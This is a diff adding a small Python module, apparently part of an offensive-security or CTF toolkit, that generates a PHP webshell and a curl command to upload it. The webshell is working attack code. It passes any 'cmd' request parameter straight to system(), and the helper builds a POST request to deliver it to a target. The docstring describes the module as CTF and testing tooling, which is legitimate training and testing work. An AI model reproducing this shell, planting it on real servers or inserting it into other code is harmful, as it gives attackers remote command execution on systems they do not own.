@@ -1,3 +1,52 @@
+"""PHP webshell and curl utilities for web exploitation.
+
+This module provides helpers for generating a minimal PHP webshell string and
+constructing a curl command to upload it. Intended for CTF and testing utilities
+within the CAI project. Keep outputs inert (do not execute uploads).
+"""
+# pylint: disable=unused-argument  # noqa: E501
+
+
+def generate_php_webshell(target_url=None, port=None, protocol="http", ctf=None):
+    """Generate a small PHP webshell payload.
+
+    Args:
+        target_url: Target URL (not used by generator, included for interface parity)
+        port: Port number (optional)
+        protocol: Protocol string (e.g., "http").
+        ctf: Optional CTF helper/context object.
+
+    Returns:
+        Tuple[str, str]: (shell_content, hint_upload_command)
+    """
+    # A deliberately minimal, non-obfuscated PHP webshell useful for CTFs.
+    shell = (
+        "<?php\n"
+        "if (isset($_REQUEST['cmd'])) {\n"
+        "    $cmd = ($_REQUEST['cmd']);\n"
+        "    system($cmd);\n"
+        "}\n"
+        "?>"
+    )
+
+    hint_cmd = f"# Create file 'shell.php' containing the above payload and upload it to the target."
+    return shell, hint_cmd
+
+
+def generate_curl_upload_cmd(url, filename="shell.php", ctf=None):
+    """Generates a curl command to upload a PHP webshell.
+
+    Args:
+        url: Target URL for upload
+        filename: Name of shell file (default: shell.php)
+        ctf: Optional CTF object to use for context
+
+    Returns:
+        Tuple[str, str]: (shell_content, curl_command)
+    """
+    shell, _ = generate_php_webshell()
+    curl_cmd = f"curl -X POST '{url}' -F \"file=@{filename}\""
+    return shell, curl_cmd
 """
 PHP webshell and curl utilities for web exploitation
 """
